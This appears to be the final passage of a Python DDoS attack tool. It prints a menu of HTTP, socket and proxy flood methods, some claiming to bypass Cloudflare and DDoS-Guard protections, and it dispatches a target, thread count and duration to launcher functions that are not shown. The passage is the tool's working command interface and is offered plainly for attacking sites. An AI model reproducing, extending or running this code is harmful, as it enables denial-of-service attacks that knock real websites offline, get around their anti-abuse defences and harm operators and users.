    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    
    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
    
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "cfsoc":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "pxsky":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")